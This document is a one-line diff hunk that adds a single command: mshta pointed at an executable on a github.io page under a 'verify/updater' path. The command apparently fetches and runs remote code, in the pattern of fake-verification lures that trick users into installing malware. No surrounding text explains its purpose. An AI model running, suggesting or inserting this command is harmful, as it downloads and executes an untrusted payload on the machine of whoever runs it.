@@ -1,0 +1,1 @@
+mshta https://puppy38.github.io/verify/updater/download.exe
